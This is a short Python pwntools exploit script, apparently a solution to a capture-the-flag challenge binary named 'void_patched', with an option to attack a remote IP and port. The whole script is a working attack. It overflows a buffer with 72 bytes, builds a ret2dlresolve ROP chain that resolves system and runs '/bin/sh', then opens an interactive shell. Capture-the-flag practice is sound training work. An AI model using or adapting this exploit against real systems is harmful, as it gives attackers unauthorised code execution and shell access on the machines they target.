#!/usr/bin/python3

from pwn import *
import argparse
from time import *


parser = argparse.ArgumentParser(description='Exploit script')
parser.add_argument('remote', nargs='?', default=None, help='Run the exploit on a remote server')
args = parser.parse_args()

exe = ELF('./void_patched', checksec=False)
#libc = ELF('./libc.so.6', checksec=False)
#ld = ELF('./ld-linux-x86-64.so.2', checksec=False)
#libc = exe.libc

context.binary = exe
context.terminal = ['wt.exe','-d', '.', 'wsl.exe', '-d', 'Ubuntu-22.04']

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
sln = lambda msg, num: sla(msg, str(num).encode())
sn = lambda msg, num: sa(msg, str(num).encode())

def GDB():
    if args.remote is None:
        gdb.attach(p, gdbscript='''
        b* vuln+31
        
        c
        ''')
        input()

if args.remote:
    p = remote('94.237.55.128',30805)  
else:
    p = process(exe.path)  

#GDB()

dlresolve = Ret2dlresolvePayload(exe, symbol='system', args=['/bin/sh\0'])
rop = ROP(exe)
rop.read(0, dlresolve.data_addr)
rop.raw(rop.ret[0])
rop.ret2dlresolve(dlresolve)
raw_rop = rop.chain()

pl = flat(
    b'a'*72,
    raw_rop,
    
)

p.send(pl)

p.send(dlresolve.payload)






p.interactive()
